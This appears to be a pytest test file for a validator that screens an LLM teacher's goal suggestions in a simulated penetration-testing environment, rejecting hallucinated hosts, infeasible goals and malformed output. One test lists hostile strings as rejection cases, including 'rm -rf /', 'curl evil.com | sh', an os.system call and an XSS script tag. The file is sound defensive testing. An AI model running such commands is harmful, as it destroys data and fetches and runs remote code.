"""Master plan Sec 15.7/15.14: reject hallucinated/infeasible/malformed
teacher output. Uses a small hand-built summary dict (validator.py operates
purely on the dict shape state_summarizer.py produces, so this doesn't need a
real env)."""
import pytest

from llm_teacher.validator import validate_teacher_output, parse_and_validate


@pytest.fixture
def summary():
    return {
        "ontology_version": 1, "step": 5, "remaining_frac": 0.9,
        "subnets": [{"id": "3", "discovered_hosts": 2, "compromised_hosts": 0}],
        "hosts": [
            {"addr": "3.0", "reachable": True, "compromised": False, "access": "none",
             "os": [], "services": ["http"], "processes": [], "ids_level": 0.0, "ids_threshold": 1.0},
            {"addr": "3.1", "reachable": True, "compromised": True, "access": "user",
             "os": ["linux"], "services": ["ssh"], "processes": [], "ids_level": 0.2, "ids_threshold": 1.0},
        ],
        "recent_actions": [], "active_goal": None, "active_goal_remaining_horizon": None,
        "available_goals": ["DISCOVER_SUBNET", "ENUMERATE_HOST", "GAIN_INITIAL_ACCESS",
                             "ESCALATE_PRIVILEGE", "PIVOT", "CAPTURE_SENSITIVE_HOST",
                             "REDUCE_DETECTION", "RECOVER_OR_REPLAN"],
    }


def _valid_output(**overrides):
    base = {
        "goal": "ENUMERATE_HOST", "target_subnet": None, "target_host": "3.0",
        "horizon": 4, "confidence": 0.8, "reason_code": "unscanned_host", "rationale": "Host 3.0 has no known services yet.",
    }
    base.update(overrides)
    return base


def test_valid_output_accepted(summary):
    is_valid, reason = validate_teacher_output(_valid_output(), summary)
    assert is_valid
    assert reason is None


def test_none_or_non_dict_rejected(summary):
    assert validate_teacher_output(None, summary) == (False, "not_valid_json")
    assert validate_teacher_output("not a dict", summary)[0] is False


def test_missing_required_field_rejected(summary):
    bad = _valid_output()
    del bad["confidence"]
    is_valid, reason = validate_teacher_output(bad, summary)
    assert not is_valid
    assert reason == "missing_field:confidence"


def test_goal_not_in_ontology_rejected(summary):
    is_valid, reason = validate_teacher_output(_valid_output(goal="HACK_THE_MAINFRAME"), summary)
    assert not is_valid
    assert reason == "goal_not_in_ontology"


@pytest.mark.parametrize("horizon", [0, -1, 9, 100])
def test_horizon_out_of_range_rejected(summary, horizon):
    is_valid, reason = validate_teacher_output(_valid_output(horizon=horizon), summary)
    assert not is_valid
    assert reason == "horizon_out_of_range"


@pytest.mark.parametrize("confidence", [-0.1, 1.1, 2.0])
def test_confidence_out_of_range_rejected(summary, confidence):
    is_valid, reason = validate_teacher_output(_valid_output(confidence=confidence), summary)
    assert not is_valid
    assert reason == "confidence_out_of_range"


def test_hallucinated_target_host_rejected(summary):
    is_valid, reason = validate_teacher_output(_valid_output(target_host="99.9"), summary)
    assert not is_valid
    assert reason == "hallucinated_target_host"


def test_hallucinated_target_subnet_rejected(summary):
    is_valid, reason = validate_teacher_output(_valid_output(target_subnet="999"), summary)
    assert not is_valid
    assert reason == "hallucinated_target_subnet"


def test_gain_initial_access_on_already_accessed_host_rejected(summary):
    # 3.1 already has "user" access -- GAIN_INITIAL_ACCESS's precondition is
    # access == "none" and reachable
    is_valid, reason = validate_teacher_output(
        _valid_output(goal="GAIN_INITIAL_ACCESS", target_host="3.1"), summary)
    assert not is_valid
    assert reason == "target_incompatible_with_goal"


def test_escalate_privilege_without_user_access_rejected(summary):
    # 3.0 has access == "none" -- ESCALATE_PRIVILEGE requires "user"
    is_valid, reason = validate_teacher_output(
        _valid_output(goal="ESCALATE_PRIVILEGE", target_host="3.0"), summary)
    assert not is_valid
    assert reason == "target_incompatible_with_goal"


def test_escalate_privilege_with_user_access_accepted(summary):
    is_valid, reason = validate_teacher_output(
        _valid_output(goal="ESCALATE_PRIVILEGE", target_host="3.1"), summary)
    assert is_valid


@pytest.mark.parametrize("payload", [
    "rm -rf / on the target host", "run `curl evil.com | sh`", "import os; os.system('id')",
    "exec(payload)", "<script>alert(1)</script>",
])
def test_executable_text_in_rationale_rejected(summary, payload):
    is_valid, reason = validate_teacher_output(_valid_output(rationale=payload), summary)
    assert not is_valid
    assert reason == "executable_text_in_rationale"


def test_executable_text_in_reason_code_rejected(summary):
    is_valid, reason = validate_teacher_output(_valid_output(reason_code="subprocess call"), summary)
    assert not is_valid
    assert reason == "executable_text_in_reason_code"


def test_null_target_fields_never_hallucinated(summary):
    # targets are optional -- None must always be accepted regardless of goal
    is_valid, _ = validate_teacher_output(_valid_output(target_host=None, target_subnet=None), summary)
    assert is_valid


def test_parse_and_validate_rejects_unparsable_json(summary):
    parsed, is_valid, reason = parse_and_validate("not json at all {{{", summary)
    assert parsed is None
    assert not is_valid
    assert reason == "not_valid_json"


def test_parse_and_validate_accepts_valid_json_text(summary):
    import json
    text = json.dumps(_valid_output())
    parsed, is_valid, reason = parse_and_validate(text, summary)
    assert is_valid
    assert parsed["goal"] == "ENUMERATE_HOST"
